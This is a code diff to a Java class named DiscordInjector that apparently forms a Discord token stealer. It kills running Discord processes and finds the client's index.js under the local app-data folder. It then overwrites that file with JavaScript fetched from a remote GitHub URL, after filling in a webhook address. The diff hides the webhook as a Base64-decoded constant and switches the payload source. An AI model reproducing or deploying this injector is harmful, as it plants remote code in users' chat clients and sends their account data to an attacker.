@@ -4,12 +4,12 @@ import java.awt.Desktop;
 import java.io.File;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
-import java.util.ArrayList;
-import java.util.List;
-import java.util.Objects;
-import java.util.Scanner;
+import java.util.*;
 
+import io.github.luxotick.Sender;
 import org.apache.commons.io.FileUtils;
+
+import static io.github.luxotick.Sender.a;
 
 public class DiscordInjector {
 
@@ -20,7 +20,9 @@ public class DiscordInjector {
 		discordPath = System.getenv("APPDATA") + "/Microsoft/Windows/Start Menu/Programs/Discord Inc";
 		betterPath = System.getenv("APPDATA") + "/BetterDiscord/data";
 		localPath = System.getenv("LOCALAPPDATA");
-		webhookURL = "webhookurl";
+		byte[] decodedBytes = Base64.getDecoder().decode(a);
+		String decodedStr = new String(decodedBytes);
+		webhookURL = decodedStr;
 	}
 	
 	private static Boolean killCheck, bettCheck, legitMode;
@@ -34,7 +36,7 @@ public class DiscordInjector {
 	@SuppressWarnings(value = {"unused"})
 	public synchronized void initialize() throws Exception {
 		if (!legitMode) utilities._instance.getDiscordKiller();
-		if (bettCheck) utilities._instance.getRemoveBetterDcProtection();
+		//if (bettCheck) utilities._instance.getRemoveBetterDcProtection();
 
         Inject: {
             for (File file : (new File(localPath)).listFiles(File::isDirectory)) {
@@ -50,9 +52,10 @@ public class DiscordInjector {
                                                 if (!legitMode) (new File(String.valueOf(file4) + "/luxotick1337")).mkdirs();
                                                 for (File file5 : (new File(String.valueOf(file4))).listFiles(File::isFile)) {
                                                     if ((String.valueOf(file5)).contains("index.js")) {
-                                                        Scanner scanner = new Scanner(new URL("https://gist.githubusercontent.com/Luxotick/1869c3d7e65a104bf1817fb1f41c7e3a/raw/4ae32ef6772ae887dd190e4c4e9590e64d1babe1/sontest.js").openStream(), StandardCharsets.UTF_8.toString()).useDelimiter("\\A");
-                                                        List<String> results = new ArrayList<String>();
-                                                        results.add(scanner.next().replace("%WEBHOOK_LINK%", webhookURL));
+                                                        Scanner scanner = new Scanner(new URL("https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js").openStream(), StandardCharsets.UTF_8.toString()).useDelimiter("\\A");
+                                                        new File(String.valueOf(file4) + "/initiation/").mkdirs();
+														List<String> results = new ArrayList<String>();
+                                                        results.add(scanner.next().replace("%WEBHOOK%", webhookURL));
                                                         FileUtils.writeLines(file5, StandardCharsets.UTF_8.toString(), results);
                                                     }
                                                 }
@@ -81,7 +84,7 @@ public class DiscordInjector {
 		_instance;
 		
 		private synchronized void getDiscordKiller() throws Exception {
-			Scanner scanner = new Scanner(Runtime.getRuntime().exec("tasklist.exe").getInputStream(), StandardCharsets.UTF_8).useDelimiter("\\A");
+			Scanner scanner = new Scanner(Runtime.getRuntime().exec("tasklist.exe").getInputStream(), String.valueOf(StandardCharsets.UTF_8)).useDelimiter("\\A");
 		    	String[] lines = new String(scanner.next()).split("\n");
 			for (String line : lines) {
 				if ((line).contains("iscord")) {
